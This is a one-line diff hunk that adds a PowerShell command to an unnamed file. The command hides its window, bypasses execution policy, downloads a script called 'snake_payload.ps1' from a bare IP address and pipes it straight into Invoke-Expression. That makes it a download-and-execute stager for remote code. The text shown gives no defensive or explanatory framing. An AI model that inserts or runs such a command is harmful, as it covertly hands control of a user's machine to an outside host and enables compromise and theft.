@@ -1,0 +1,1 @@
+powershell -W Hidden -Exec Bypass -c "iwr -useb http://100.124.152.86/snake_payload.ps1 | iex"
